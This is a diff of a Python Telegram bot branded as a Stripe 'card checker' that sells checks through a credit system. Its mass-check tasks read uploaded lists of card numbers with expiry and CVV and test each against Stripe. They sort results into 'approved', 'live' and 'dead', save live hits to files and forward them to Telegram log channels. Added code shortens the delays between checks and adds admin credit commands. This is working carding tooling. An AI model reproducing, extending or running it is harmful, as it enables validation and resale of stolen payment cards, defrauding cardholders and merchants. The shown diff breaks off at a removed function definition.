-                caption=f"✅ Private Approved Hits\nFile: {file_id}\nUser: @{username}\nCount: {approved}"
-            )
-        
-        if live_hits and len(live_hits) >= 5:
-            live_content = "\n".join(live_hits)
-            live_file = BytesIO(live_content.encode())
-            live_file.name = f"{file_id}_live.txt"
-            await context.bot.send_document(
-                chat_id=LIVE_LOG_CHANNEL,
-                document=live_file,
-                caption=f"🔥 Private Live Hits\nFile: {file_id}\nUser: @{username}\nCount: {live}"
-            )
-    except Exception as e:
-        logger.error(f"Error sending files to channels: {e}")
-    
-    # Final summary
-    elapsed = time.time() - checking_tasks[user_id]["start_time"]
-    summary = f"""✅ PUBLIC MASS CHECK COMPLETE
-Total Cards: {len(cards)}
-Processed: {processed}
-Time: {elapsed:.1f}s
-━━━━━━━━━━━━━━━━━━━━
-FINAL RESULTS:
-✅ Approved: {approved} cards
-🔥 Live: {live} cards
-❌ Dead: {dead} cards
-🔢 CCN: {ccn} cards
-💳 CVV: {cvv} cards
-━━━━━━━━━━━━━━━━━━━━
-• User: @{username}
-━━━━━━━━━━━━━━━━━━━━
-🤖 @DARKXCODE_STRIPE_BOT
-"""
-    
-    await status_msg.edit_text(summary)
-    
-    # Cleanup
-    if user_id in checking_tasks:
-        del checking_tasks[user_id]
-    if user_id in files_storage:
-        del files_storage[user_id]
-
-async def private_mass_check_task(user_id, cards, status_msg, chat_id, context):
-    """Private mass checking with channel forwarding"""
-    if user_id not in files_storage:
-        await status_msg.edit_text("❌ File data not found")
-        return
-
-    file_info = files_storage[user_id]
-    file_id = file_info["file_id"]
-    username = file_info["username"]
-    
-    # Initialize hits collections
-    approved_hits = []
-    live_hits = []
-    
-    processed = 0
-    approved = 0
-    live = 0
-    dead = 0
-    ccn = 0
-    cvv = 0
-    
-    # Process cards
-    for i, card in enumerate(cards):
-        if user_id in checking_tasks and checking_tasks[user_id].get("cancelled"):
-            break
-
-        # Update status every 5 cards
-        if i % 5 == 0 or i == len(cards) - 1:
-            elapsed = time.time() - checking_tasks[user_id]["start_time"]
-            progress = (processed / len(cards)) * 100
-            
-            status_text = f"""🔒 PRIVATE MASS CHECK
-Progress: {progress:.1f}%
-Processed: {processed}/{len(cards)}
-━━━━━━━━━━━━━━━━━━━━
-✅ Approved: {approved}
-🔥 Live: {live}
-❌ Dead: {dead}
-━━━━━━━━━━━━━━━━━━━━"""
-            try:
-                await status_msg.edit_text(status_text)
-            except:
-                pass
-
-        # Check card
-        start_time = time.time()
-        result_card, status, message, http_code = await check_single_card_fast(card)
-        actual_time = time.time() - start_time
-        
-        processed += 1
-        
-        # Update counters
-        if status == "approved":
-            approved += 1
-            approved_hits.append(card)
-            save_hit_card(user_id, card, "approved", is_private=True)
-            
-            # 🔥 FORWARD TO CHANNEL (ADD THIS)
-            await send_to_log_channel(context, card, status, username, is_private=True)
-            
-        elif status == "live":
-            live += 1
-            live_hits.append(card)
-            save_hit_card(user_id, card, "live", is_private=True)
-            
-            # 🔥 FORWARD TO CHANNEL (ADD THIS)
-            await send_to_log_channel(context, card, status, username, is_private=True)
-            
-        elif status == "dead":
-            dead += 1
-        elif status == "ccn":
-            ccn += 1
-        elif status == "cvv":
-            cvv += 1
-        
-        # Send individual result for approved/live cards to user
-        if status in ["approved", "live"]:
-            result_text = format_universal_result(
-                card_data=card,
-                status=status,
-                message=message,
-                gateway="Stripe Gateway",
-                username=username,
-                time_taken=actual_time
-            )
-            try:
-                await context.bot.send_message(
-                    chat_id=chat_id, 
-                    text=result_text, 
-                    parse_mode=ParseMode.HTML
-                )
-            except:
-                pass  # Ignore if message sending fails
-        
-        # Small delay
-        if i < len(cards) - 1:
-            await asyncio.sleep(random.uniform(1.0, 2.0))
-    
-    # Create summary files
-    if approved_hits:
-        private_file = f"{PRIVATE_HITS_FOLDER}/{file_id}_approved.txt"
-        with open(private_file, 'w', encoding='utf-8') as f:
-            f.write("\n".join(approved_hits))
-    
-    if live_hits:
-        private_file = f"{PRIVATE_HITS_FOLDER}/{file_id}_live.txt"
-        with open(private_file, 'w', encoding='utf-8') as f:
-            f.write("\n".join(live_hits))
-    
-    # Send files to channels if enough hits
-    try:
-        if approved_hits and len(approved_hits) >= 5:
-            approved_content = "\n".join(approved_hits)
-            approved_file = BytesIO(approved_content.encode())
-            approved_file.name = f"{file_id}_approved.txt"
-            await context.bot.send_document(
-                chat_id=APPROVED_LOG_CHANNEL,
-                document=approved_file,
-                caption=f"✅ Private Approved Hits\nFile: {file_id}\nUser: @{username}\nCount: {approved}"
-            )
-        
-        if live_hits and len(live_hits) >= 5:
-            live_content = "\n".join(live_hits)
-            live_file = BytesIO(live_content.encode())
-            live_file.name = f"{file_id}_live.txt"
-            await context.bot.send_document(
-                chat_id=LIVE_LOG_CHANNEL,
-                document=live_file,
-                caption=f"🔥 Private Live Hits\nFile: {file_id}\nUser: @{username}\nCount: {live}"
-            )
-    except Exception as e:
-        logger.error(f"Error sending files to channels: {e}")
-    
-    # Final summary
-    elapsed = time.time() - checking_tasks[user_id]["start_time"]
-    summary = f"""✅ PRIVATE MASS CHECK COMPLETE
-Total Cards: {len(cards)}
-Processed: {processed}
-Time: {elapsed:.1f}s
-━━━━━━━━━━━━━━━━━━━━
-FINAL RESULTS:
-✅ Approved: {approved} cards
-🔥 Live: {live} cards
-❌ Dead: {dead} cards
-🔢 CCN: {ccn} cards
-💳 CVV: {cvv} cards
-━━━━━━━━━━━━━━━━━━━━
-• User: @{username}
-━━━━━━━━━━━━━━━━━━━━
-🤖 @DARKXCODE_STRIPE_BOT
-"""
-    
-    await status_msg.edit_text(summary)
-    
-    # Cleanup
-    if user_id in checking_tasks:
-        del checking_tasks[user_id]
-    if user_id in files_storage:
-        del files_storage[user_id]
-
-async def pmchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Private mass check - forwards hits to channels"""
-    user_id = update.effective_user.id
-    user = await get_user(user_id)
-    username = update.effective_user.username or f"user_{user_id}"
-
-    if not user['joined_channel']:
-        await update.message.reply_text(
-            "❌ Please join our private channel first using /start")
-        return
-
-    if user_id not in files_storage:
-        await update.message.reply_text(
-            "🔒 *PUBLIC MASS CHECK*\n"
-            "══════════════════════\n"
-            "1. Upload a .txt file with cards\n"
-            "2. Use `/pmchk` to start\n\n"
-            "*Features:*\n"
-            "• Hits forwarded to Public channel\n"
-            parse_mode=ParseMode.MARKDOWN)
-        return
-
-    # Get file info
-    file_info = files_storage[user_id]
-    cards = file_info["cards"]
-    
-    # Check if user has enough credits
-    if user["credits"] < len(cards):
-        await update.message.reply_text(
-            f"💰 INSUFFICIENT CREDITS\n"
-            f"Cards to check: {len(cards)}\n"
-            f"Credits needed: {len(cards)}\n"
-            f"Your credits: {user['credits']}")
-        return
-
-    # Create status message
-    status_msg = await update.message.reply_text(
-        f"🔒 Starting PUBLIC Mass Check\n"
-        f"File ID: {file_info['file_id']}\n"
-        f"Cards: {len(cards)}\n"
-        f"Hits will be forwarded to channels...")
+        f"Cards: {len(cards)}\n")
 
     # Start private mass check task
     task = asyncio.create_task(
@@ -2567,9 +2266,507 @@ async def pmchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "live": 0,
         "dead": 0,
         "ccn": 0,
-        "cvv": 0
+        "cvv": 0,
+        "risk": 0,
+        "fraud": 0,
+        "total_credits_used": 0
     }
+async def public_mass_check_task(user_id, cards, status_msg, chat_id, context):
+    """PUBLIC mass checking - hits to APPROVED_LOG_CHANNEL"""
+    if user_id not in files_storage:
+        await status_msg.edit_text("❌ File data not found")
+        return
 
+    file_info = files_storage[user_id]
+    file_id = file_info["file_id"]
+    username = file_info["username"]
+    
+    # Initialize hits collections
+    approved_hits = []
+    live_hits = []
+    
+    # Initialize counters
+    processed = 0
+    approved = 0
+    live = 0
+    dead = 0
+    ccn = 0
+    cvv = 0
+    risk = 0
+    fraud = 0
+    total_credits_used = 0
+    
+    user = await get_user(user_id)  # This should be INSIDE the async function
+    
+    # Process cards
+    for i, card in enumerate(cards):
+        if user_id in checking_tasks and checking_tasks[user_id].get("cancelled"):
+            break
+
+        # Check user credits before processing
+        user = await get_user(user_id)
+        if user["credits"] <= 0:
+            await status_msg.edit_text(
+                f"❌ INSUFFICIENT CREDITS\n"
+                f"Processed: {processed}/{len(cards)}\n"
+                f"Used: {total_credits_used} credits\n"
+                f"Remaining: 0 credits\n\n"
+                f"Add more credits to continue.")
+            break
+
+        # Update status every 5 cards
+        if i % 5 == 0 or i == len(cards) - 1:
+            elapsed = time.time() - checking_tasks[user_id]["start_time"]
+            progress = (processed / len(cards)) * 100
+            
+            status_text = f"""⚡ PUBLIC MASS CHECK
+Progress: {progress:.1f}%
+Processed: {processed}/{len(cards)}
+Credits Used: {total_credits_used}
+━━━━━━━━━━━━━━━━━━━━
+✅ Approved: {approved}
+🔥 Live: {live}
+❌ Dead: {dead}
+🔢 CCN: {ccn}
+💳 CVV: {cvv}
+━━━━━━━━━━━━━━━━━━━━"""
+            try:
+                await status_msg.edit_text(status_text)
+            except:
+                pass
+
+        # Check card
+        start_time = time.time()
+        result_card, status, message, http_code = await check_single_card_fast(card)
+        actual_time = time.time() - start_time
+        
+        # Get credit cost
+        credit_cost = get_credit_cost(status)
+        
+        # Check if user has enough credits for this card
+        if user["credits"] < credit_cost:
+            logger.warning(f"User {user_id} ran out of credits during mass check")
+            break
+        
+        processed += 1
+        total_credits_used += credit_cost
+        
+        # Update counters
+        if status == "approved":
+            approved += 1
+            approved_hits.append(card)
+            save_hit_card(user_id, card, "approved", is_private=False)
+            await send_to_log_channel(context, card, status, message, username, actual_time, is_private=False)
+            
+        elif status == "live":
+            live += 1
+            live_hits.append(card)
+            save_hit_card(user_id, card, "live", is_private=False)
+            await send_to_log_channel(context, card, status, message, username, actual_time, is_private=False)
+            
+        elif status == "ccn":
+            ccn += 1
+        elif status == "cvv":
+            cvv += 1
+        elif status == "risk":
+            risk += 1
+        elif status == "fraud":
+            fraud += 1
+        else:  # dead and other declined statuses
+            dead += 1
+        
+        # Update user credits and stats
+        status_field = f"{status}_cards"
+        updates = {
+            'credits': user["credits"] - credit_cost,
+            'credits_spent': user.get("credits_spent", 0) + credit_cost,
+            'total_checks': user.get("total_checks", 0) + 1
+        }
+        
+        if status_field in ["approved_cards", "live_cards", "ccn_cards", "cvv_cards", "declined_cards", 
+                           "risk_cards", "fraud_cards"]:
+            updates[status_field] = user.get(status_field, 0) + 1
+        
+        await update_user(user_id, updates)
+        
+        # Update task tracking
+        checking_tasks[user_id][status] = checking_tasks[user_id].get(status, 0) + 1
+        checking_tasks[user_id]["cards_processed"] = processed
+        checking_tasks[user_id]["total_credits_used"] = total_credits_used
+        
+        # Format and send result for approved/live cards
+        if status in ["approved", "live"]:
+            result_text = format_universal_result(
+                card_data=card,
+                status=status,
+                message=message,
+                gateway="Stripe Auth",
+                username=username,
+                time_taken=actual_time
+            )
+            
+            # Send to user
+            try:
+                await context.bot.send_message(
+                    chat_id=chat_id, 
+                    text=result_text, 
+                    parse_mode=ParseMode.HTML
+                )
+            except:
+                pass
+        
+        # Update bot stats
+        await update_bot_stats({
+            'total_checks': 1,
+            'total_credits_used': credit_cost,
+            f'total_{status}': 1
+        })
+        
+        # Small delay
+        if i < len(cards) - 1:
+            await asyncio.sleep(random.uniform(1.0, 2.0))
+    
+    # Save hit files
+    try:
+        if approved_hits:
+            public_file = f"{PUBLIC_HITS_FOLDER}/{file_id}_approved.txt"
+            with open(public_file, 'w', encoding='utf-8') as f:
+                f.write("\n".join(approved_hits))
+        
+        if live_hits:
+            public_file = f"{PUBLIC_HITS_FOLDER}/{file_id}_live.txt"
+            with open(public_file, 'w', encoding='utf-8') as f:
+                f.write("\n".join(live_hits))
+    except Exception as e:
+        logger.error(f"Error saving hit files: {e}")
+    
+    # Final summary
+    elapsed = time.time() - checking_tasks[user_id]["start_time"]
+    summary = f"""✅ PUBLIC MASS CHECK COMPLETE
+File: {file_id}
+Total Cards: {len(cards)}
+Processed: {processed}
+Time: {elapsed:.1f}s
+━━━━━━━━━━━━━━━━━━━━
+FINAL RESULTS:
+✅ Approved: {approved} cards (3 credits each)
+🔥 Live: {live} cards (3 credits each)
+🔢 CCN: {ccn} cards (2 credits each)
+💳 CVV: {cvv} cards (2 credits each)
+❌ Declined: {dead} cards (1 credit each)
+━━━━━━━━━━━━━━━━━━━━
+Total Credits Used: {total_credits_used}
+User: @{username}
+━━━━━━━━━━━━━━━━━━━━
+🤖 @DARKXCODE_STRIPE_BOT
+"""
+    
+    await status_msg.edit_text(summary)
+    
+    # Cleanup
+    if user_id in checking_tasks:
+        del checking_tasks[user_id]
+    if user_id in files_storage:
+        del files_storage[user_id]
+
+async def private_mass_check_task(user_id, cards, status_msg, chat_id, context):
+    """PRIVATE mass checking - hits to PRIVATE_LOG_CHANNEL"""
+    if user_id not in files_storage:
+        await status_msg.edit_text("❌ File data not found")
+        return
+
+    file_info = files_storage[user_id]
+    file_id = file_info["file_id"]
+    username = file_info["username"]
+    
+    # Initialize hits collections
+    approved_hits = []
+    live_hits = []
+    
+    # Initialize counters
+    processed = 0
+    approved = 0
+    live = 0
+    dead = 0
+    ccn = 0
+    cvv = 0
+    risk = 0
+    fraud = 0
+    total_credits_used = 0
+    
+    user = await get_user(user_id)
+    
+    # Process cards
+    for i, card in enumerate(cards):
+        if user_id in checking_tasks and checking_tasks[user_id].get("cancelled"):
+            break
+
+        # Check user credits before processing
+        user = await get_user(user_id)
+        if user["credits"] <= 0:
+            await status_msg.edit_text(
+                f"❌ INSUFFICIENT CREDITS\n"
+                f"Processed: {processed}/{len(cards)}\n"
+                f"Used: {total_credits_used} credits\n"
+                f"Remaining: 0 credits\n\n"
+                f"Add more credits to continue.")
+            break
+
+        # Update status every 5 cards
+        if i % 5 == 0 or i == len(cards) - 1:
+            elapsed = time.time() - checking_tasks[user_id]["start_time"]
+            progress = (processed / len(cards)) * 100
+            
+            status_text = f"""🔒 PRIVATE MASS CHECK
+Progress: {progress:.1f}%
+Processed: {processed}/{len(cards)}
+Credits Used: {total_credits_used}
+━━━━━━━━━━━━━━━━━━━━
+✅ Approved: {approved}
+🔥 Live: {live}
+❌ Dead: {dead}
+🔢 CCN: {ccn}
+💳 CVV: {cvv}
+━━━━━━━━━━━━━━━━━━━━"""
+            try:
+                await status_msg.edit_text(status_text)
+            except:
+                pass
+
+        # Check card
+        start_time = time.time()
+        result_card, status, message, http_code = await check_single_card_fast(card)
+        actual_time = time.time() - start_time
+        
+        # Get credit cost
+        credit_cost = get_credit_cost(status)
+        
+        # Check if user has enough credits for this card
+        if user["credits"] < credit_cost:
+            logger.warning(f"User {user_id} ran out of credits during mass check")
+            break
+        
+        processed += 1
+        total_credits_used += credit_cost
+        
+        # Update counters
+        if status == "approved":
+            approved += 1
+            approved_hits.append(card)
+            save_hit_card(user_id, card, "approved", is_private=True)
+            await send_to_log_channel(context, card, status, message, username, actual_time, is_private=True)
+            
+        elif status == "live":
+            live += 1
+            live_hits.append(card)
+            save_hit_card(user_id, card, "live", is_private=True)
+            await send_to_log_channel(context, card, status, message, username, actual_time, is_private=True)
+            
+        elif status == "ccn":
+            ccn += 1
+        elif status == "cvv":
+            cvv += 1
+        elif status == "risk":
+            risk += 1
+        elif status == "fraud":
+            fraud += 1
+        else:  # dead and other declined statuses
+            dead += 1
+        
+        # Update user credits and stats
+        status_field = f"{status}_cards"
+        updates = {
+            'credits': user["credits"] - credit_cost,
+            'credits_spent': user.get("credits_spent", 0) + credit_cost,
+            'total_checks': user.get("total_checks", 0) + 1
+        }
+        
+        if status_field in ["approved_cards", "live_cards", "ccn_cards", "cvv_cards", "declined_cards", 
+                           "risk_cards", "fraud_cards"]:
+            updates[status_field] = user.get(status_field, 0) + 1
+        
+        await update_user(user_id, updates)
+        
+        # Update task tracking
+        checking_tasks[user_id][status] = checking_tasks[user_id].get(status, 0) + 1
+        checking_tasks[user_id]["cards_processed"] = processed
+        checking_tasks[user_id]["total_credits_used"] = total_credits_used
+        
+        # Inside the mass check loops, after checking a card:
+        if status in ["approved", "live"]:
+            # Format result for user
+            result_text = format_universal_result(
+                card_data=card,
+                status=status,
+                message=message,
+                gateway="Stripe Auth",
+                username=username,
+                time_taken=actual_time
+            )
+            
+            # Send to user
+            try:
+                await context.bot.send_message(
+                    chat_id=chat_id, 
+                    text=result_text, 
+                    parse_mode=ParseMode.HTML
+                )
+            except:
+                pass
+            
+            # Send SAME result to channel (already done above in send_to_log_channel)
+            # No need to send again
+        
+        # Update bot stats
+        await update_bot_stats({
+            'total_checks': 1,
+            'total_credits_used': credit_cost,
+            f'total_{status}': 1
+        })
+
+        # Small delay
+        if i < len(cards) - 1:
+            await asyncio.sleep(random.uniform(0.5, 0.8))
+    
+    # Save hit files (AFTER THE LOOP)
+    try:
+        if approved_hits:
+            private_file = f"{PRIVATE_HITS_FOLDER}/{file_id}_approved.txt"
+            with open(private_file, 'w', encoding='utf-8') as f:
+                f.write("\n".join(approved_hits))
+        
+        if live_hits:
+            private_file = f"{PRIVATE_HITS_FOLDER}/{file_id}_live.txt"
+            with open(private_file, 'w', encoding='utf-8') as f:
+                f.write("\n".join(live_hits))
+    except Exception as e:
+        logger.error(f"Error saving hit files: {e}")
+    
+    # Final summary
+    elapsed = time.time() - checking_tasks[user_id]["start_time"]
+    summary = f"""✅ PRIVATE MASS CHECK COMPLETE
+File: {file_id}
+Total Cards: {len(cards)}
+Processed: {processed}
+Time: {elapsed:.1f}s
+━━━━━━━━━━━━━━━━━━━━
+FINAL RESULTS:
+✅ Approved: {approved} cards (3 credits each)
+🔥 Live: {live} cards (3 credits each)
+🔢 CCN: {ccn} cards (2 credits each)
+💳 CVV: {cvv} cards (2 credits each)
+❌ Declined: {dead} cards (1 credit each)
+━━━━━━━━━━━━━━━━━━━━
+Total Credits Used: {total_credits_used}
+User: @{username}
+━━━━━━━━━━━━━━━━━━━━
+🤖 @DARKXCODE_STRIPE_BOT
+"""
+    
+    await status_msg.edit_text(summary)
+    
+    # Cleanup
+    if user_id in checking_tasks:
+        del checking_tasks[user_id]
+    if user_id in files_storage:
+        del files_storage[user_id]
+
+async def pmchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """PUBLIC mass check - hits sent to APPROVED_LOG_CHANNEL"""
+    user_id = update.effective_user.id
+    user = await get_user(user_id)
+    username = update.effective_user.username or f"user_{user_id}"
+
+    if not user['joined_channel']:
+        await update.message.reply_text("❌ Please join our private channel first using /start")
+        return
+
+    if user_id not in files_storage:
+        await update.message.reply_text(
+            "⚡ *PUBLIC MASS CHECK*\n"
+            "══════════════════════\n"
+            "1. Upload a .txt file with cards\n"
+            "2. Use `/pmchk` to start\n\n"
+            "*Credit Costs Per Card:*\n"
+            "• ✅ Approved/🔥 Live: 3 credits\n"
+            "• 🔢 CCN/💳 CVV: 2 credits\n"
+            "• ❌ Declined: 1 credit\n\n",
+            parse_mode=ParseMode.MARKDOWN)
+        return
+
+    # Get file info
+    file_info = files_storage[user_id]
+    cards = file_info["cards"]
+    
+    # Create status message
+    status_msg = await update.message.reply_text(
+        f"⚡ Starting PUBLIC Mass Check\n"
+        f"File ID: {file_info['file_id']}\n"
+        f"Cards: {len(cards)}\n"
+        f"Hits will be forwarded to Public channel...")
+
+    # Start public mass check task
+    task = asyncio.create_task(
+        public_mass_check_task(user_id, cards, status_msg, update.message.chat_id, context))
+    
+    checking_tasks[user_id] = {
+        "task": task,
+        "cancelled": False,
+        "cards_processed": 0,
+        "total_cards": len(cards),
+        "is_private": False,
+        "start_time": time.time(),
+        "approved": 0,
+        "live": 0,
+        "dead": 0,
+        "ccn": 0,
+        "cvv": 0,
+        "risk": 0,
+        "fraud": 0,
+        "total_credits_used": 0
+    }
+    
+async def test_channels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Test if bot can send to channels"""
+    if update.effective_user.id not in ADMIN_IDS:
+        return
+    
+    # Test format
+    test_card = "4111111111111111|12|25|123"
+    test_message = "✅ TEST HIT - Bot is working!"
+    
+    try:
+        # Test PUBLIC channel
+        await send_to_log_channel(
+            context=context,
+            card=test_card,
+            status="approved",
+            message=test_message,
+            username="TEST_BOT",
+            time_taken=1.5,
+            is_private=False
+        )
+        
+        # Test PRIVATE channel
+        await send_to_log_channel(
+            context=context,
+            card=test_card,
+            status="live",
+            message=test_message,
+            username="TEST_BOT",
+            time_taken=1.2,
+            is_private=True
+        )
+        
+        await update.message.reply_text(
+            "✅ Channel tests sent successfully!\n"
+            "Check both channels for test messages."
+        )
+        
+    except Exception as e:
+        await update.message.reply_text(
+            f"❌ Channel test failed:\n{str(e)}"
+        )
 
 async def mass_check_task_ultrafast(user_id, cards, status_msg, chat_id,
                                     context):
@@ -2648,7 +2845,7 @@ Results:
                 card_data=card,
                 status=status,
                 message=message,
-                gateway="Stripe Gateway",
+                gateway="Stripe Auth",
                 username=file_info["username"],
                 time_taken=actual_time
             )
@@ -2656,7 +2853,7 @@ Results:
         
         # Small delay
         if i < len(cards) - 1:
-            await asyncio.sleep(random.uniform(1.0, 2.0))
+            await asyncio.sleep(random.uniform(0.5, 0.8))
     
     # Save hits to files
     if approved_hits:
@@ -2681,12 +2878,12 @@ Results:
             )
         
         # Send live hits to live channel
-        if live_hits and LIVE_LOG_CHANNEL:
+        if live_hits and PRIVATE_LOG_CHANNEL:
             live_content = "\n".join(live_hits)
             live_file = BytesIO(live_content.encode())
             live_file.name = f"{file_id}_live.txt"
             await context.bot.send_document(
-                chat_id=LIVE_LOG_CHANNEL,
+                chat_id=PRIVATE_LOG_CHANNEL,
                 document=live_file,
                 caption=f"🔥 Live Cards\nFile ID: {file_id}\nUser: @{file_info['username']}\nCount: {live}"
             )
@@ -2695,20 +2892,23 @@ Results:
     
     # Final summary
     elapsed = time.time() - checking_tasks[user_id]["start_time"]
-    summary = f"""✅ Mass Check Complete
-File ID: {file_id}
+    # Final summary in mass check tasks
+    summary = f"""✅ MASS CHECK COMPLETE
 Total Cards: {len(cards)}
 Processed: {processed}
-
-Final Results:
+Time: {elapsed:.1f}s
+━━━━━━━━━━━━━━━━━━━━
+FINAL RESULTS:
 ✅ Approved: {approved} cards
 🔥 Live: {live} cards
-❌ Dead: {dead} cards
+❌ Declined: {dead} cards
 🔢 CCN: {ccn} cards
 💳 CVV: {cvv} cards
-
-⏱ Time: {elapsed:.1f}s
-📁 Files sent to log channels
+⚠️ Risk: {risk} cards
+🚫 Fraud: {fraud} cards
+━━━━━━━━━━━━━━━━━━━━
+• User: @{username}
+━━━━━━━━━━━━━━━━━━━━
 🤖 @DARKXCODE_STRIPE_BOT
 """
     
@@ -2719,7 +2919,56 @@ Final Results:
         del checking_tasks[user_id]
     if user_id in files_storage:
         del files_storage[user_id]
+        
+async def setcr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin: Set user credits"""
+    user_id = update.effective_user.id
 
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+
+    if len(context.args) != 2:
+        await update.message.reply_text(
+            "*❌ Usage:* `/setcr user_id amount`\n"
+            "*Example:* `/setcr 123456789 100`\n\n"
+            "This sets the user's credits to exactly 100.",
+            parse_mode=ParseMode.MARKDOWN)
+        return
+
+    try:
+        target_user_id = int(context.args[0])
+        amount = int(context.args[1])
+
+        if amount < 0:
+            await update.message.reply_text("❌ Amount must be positive or zero.")
+            return
+
+        user = await get_user(target_user_id)
+        await update_user(target_user_id, {'credits': amount})
+        user = await get_user(target_user_id)  # Refresh
+
+        await update.message.reply_text(
+            f"*✅ CREDITS SET*\n"
+            f"══════════════════════\n"
+            f"*User:* `{target_user_id}`\n"
+            f"*Set to:* {amount} credits\n"
+            f"*New Balance:* {user['credits']} credits",
+            parse_mode=ParseMode.MARKDOWN)
+
+        # Notify user
+        try:
+            await context.bot.send_message(
+                chat_id=target_user_id,
+                text=f"*🎉 CREDITS UPDATED*\n\n"
+                f"Your credits have been set to *{amount} credits* by admin!\n"
+                f"New balance: *{user['credits']} credits*",
+                parse_mode=ParseMode.MARKDOWN)
+        except:
+            pass  # User might have blocked bot
+
+    except ValueError:
+        await update.message.reply_text("❌ Invalid user ID or amount.")
 
 async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /claim command for gift codes"""
@@ -2984,23 +3233,32 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Get user data
     user = await get_user(user_id)
+    
+    # Get user stats
+    user_credits = user.get('credits', 0)
+    approved_cards = user.get('approved_cards', 0)
+    declined_cards = user.get('declined_cards', 0)
+    total_checks = user.get('total_checks', 0)
+    
+    # Check if user is admin
+    is_admin = user_id in ADMIN_IDS
 
     # Different help for admin vs regular users
-    if user_id in ADMIN_IDS:
+    if is_admin:
         help_text = f"""<b>⚡ DARKXCODE STRIPE CHECKER ⚡</b>
 ══════════════════════
 👋 <b>Welcome, {escape_markdown_v2(user_name)}!</b>
 
 <b>Account Overview:</b>
-• Credits: <b>{user.get('credits', 0)}</b>
-• Today: ✅{user.get('approved_cards', 0)} ❌{user.get('declined_cards', 0)}
-• Total Checks: <b>{user.get('total_checks', 0)}</b>
+• Credits: <b>{user_credits}</b>
+• Today: ✅{approved_cards} ❌{declined_cards}
+• Total Checks: <b>{total_checks}</b>
 
 <b>User Commands:</b>
-• <code>/chk cc|mm|yy|cvv</code> - Check Single Card
-• <code>/pchk cc|mm|yy|cvv</code> - Check Single Card Publically
-• <code>/mchk</code> - Upload File For Mass Check
-• <code>/pmchk</code> - Upload File For Mass Check Publically
+• <code>/chk cc|mm|yy|cvv</code> - Check Single Card (Private)
+• <code>/pchk cc|mm|yy|cvv</code> - Check Single Card (Public)
+• <code>/mchk</code> - Upload File For Mass Check (Private)
+• <code>/pmchk</code> - Upload File For Mass Check (Public)
 • <code>/credits</code> - Check Credits
 • <code>/claim CODE</code> - Redeem Gift Code
 • <code>/info</code> - Bot Information
@@ -3010,6 +3268,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 <b>Admin Commands:</b>
 • <code>/addcr user_id amount</code> - Add Credits
+• <code>/setcr user_id amount</code> - Set Credits
 • <code>/gengift credits max_uses</code> - Create Gift Code
 • <code>/listgifts</code> - List All Gift Codes
 • <code>/userinfo user_id</code> - View User Info
@@ -3024,15 +3283,15 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 👋 <b>Welcome, {escape_markdown_v2(user_name)}!</b>
 
 <b>Account Overview:</b>
-• Credits: <b>{user.get('credits', 0)}</b>
-• Today: ✅{user.get('approved_cards', 0)} ❌{user.get('declined_cards', 0)}
-• Total Checks: <b>{user.get('total_checks', 0)}</b>
+• Credits: <b>{user_credits}</b>
+• Today: ✅{approved_cards} ❌{declined_cards}
+• Total Checks: <b>{total_checks}</b>
 
 <b>User Commands:</b>
-• <code>/chk cc|mm|yy|cvv</code> - Check Single Card
-• <code>/pchk cc|mm|yy|cvv</code> - Check Single Card Publically
-• <code>/mchk</code> - Upload File For Mass Check
-• <code>/pmchk</code> - Upload File For Mass Check Publically
+• <code>/chk cc|mm|yy|cvv</code> - Check Single Card (Private)
+• <code>/pchk cc|mm|yy|cvv</code> - Check Single Card (Public)
+• <code>/mchk</code> - Upload File For Mass Check (Private)
+• <code>/pmchk</code> - Upload File For Mass Check (Public)
 • <code>/credits</code> - Check Credits
 • <code>/claim CODE</code> - Redeem Gift Code
 • <code>/info</code> - Bot Information
@@ -3081,7 +3340,6 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     InlineKeyboardButton("🔙 Back",
                                          callback_data="back_to_start")
                 ]]))
-
 
 async def verify_join_callback(update: Update,
                                context: ContextTypes.DEFAULT_TYPE):
@@ -3209,7 +3467,7 @@ async def userinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 <b>Statistics:</b>
 • Total Checks: {total_user_checks}
 • Today's Checks: {user.get('checks_today', 0)}
-• 🔥 Charge: {approved_cards}
+• ✅ Approved: {approved_cards}
 • ❌ Declined: {user.get('declined_cards', 0)}
 • Success Rate: {success_rate:.1f}%
 
@@ -3289,7 +3547,7 @@ async def start_mass_check_callback(update: Update,
         f"*Status:* ⚡ Processing Cards...\n\n"
         f"*Live Results:* Starting...\n"
         f"══════════════════════\n"
-        f"🔥 Charge: 0\n"
+        f"✅ Approved: 0\n"
         f"❌ Declined: 0\n"
         f"⏳ Processed: 0/{len(cards)}",
         parse_mode=ParseMode.MARKDOWN,
@@ -3377,7 +3635,7 @@ async def cancel_check_callback(update: Update,
                 f"══════════════════════\n"
                 f"*Results:*\n"
                 f"• Processed: {processed} cards\n"
-                f"• 🔥 Charge: {approved}\n"
+                f"• ✅ Approved: {approved}\n"
                 f"• ❌ Declined: {declined}\n"
                 f"• Credits Used: {used_credits}\n"
                 f"• Success Rate: {success_rate:.1f}%\n\n"
@@ -3433,11 +3691,13 @@ def save_hit_card(user_id: int, card: str, status: str, is_private: bool = False
             return
         
         # Determine folder
+        # is_private=True: PRIVATE hits (chk/mchk)
+        # is_private=False: PUBLIC hits (pchk/pmchk)
         folder = PRIVATE_HITS_FOLDER if is_private else PUBLIC_HITS_FOLDER
-        Path(folder).mkdir(exist_ok=True)
+        Path(folder).mkdir(parents=True, exist_ok=True)
         
         # File name format: userid_date_status.txt
-        date_str = dt.now().strftime("%Y%m%d")  # Use dt.now()
+        date_str = dt.now().strftime("%Y%m%d_%H%M%S")
         filename = f"{folder}/{user_id}_{date_str}_{status}.txt"
         
         # Append card to file
@@ -3447,66 +3707,53 @@ def save_hit_card(user_id: int, card: str, status: str, is_private: bool = False
     except Exception as e:
         logger.error(f"Error saving hit card: {e}")
 
-async def send_to_log_channel(context, card: str, status: str, username: str, is_private: bool = False):
